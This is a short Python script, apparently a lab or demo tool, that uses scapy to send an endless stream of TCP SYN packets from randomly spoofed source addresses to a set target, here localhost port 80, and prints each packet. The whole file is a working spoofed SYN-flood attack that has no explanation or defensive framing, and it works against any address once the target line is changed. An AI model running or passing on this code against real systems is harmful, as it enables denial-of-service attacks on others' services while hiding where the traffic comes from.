from scapy.all import *
import random
import time

target_ip = "127.0.0.1"  # Victim IP (localhost)
target_port = 80         # Port on victim (usually HTTP)

packet_count = 0

print(f"[+] Starting IP Spoofing attack on {target_ip}:{target_port}...\n")

try:
    while True:
        # Random spoofed source IP
        spoofed_ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        # Craft packet with spoofed IP
        ip = IP(src=spoofed_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        pkt = ip / tcp

        # Send the packet
        send(pkt, verbose=False)

        # Print debug info
        packet_count += 1
        print(f"[{packet_count}] Spoofed packet from {spoofed_ip}:{src_port} -> {target_ip}:{target_port}")

        time.sleep(0.1)  # Slow down a little for visibility

except KeyboardInterrupt:
    print("\n[!] IP Spoofing attack stopped by user.")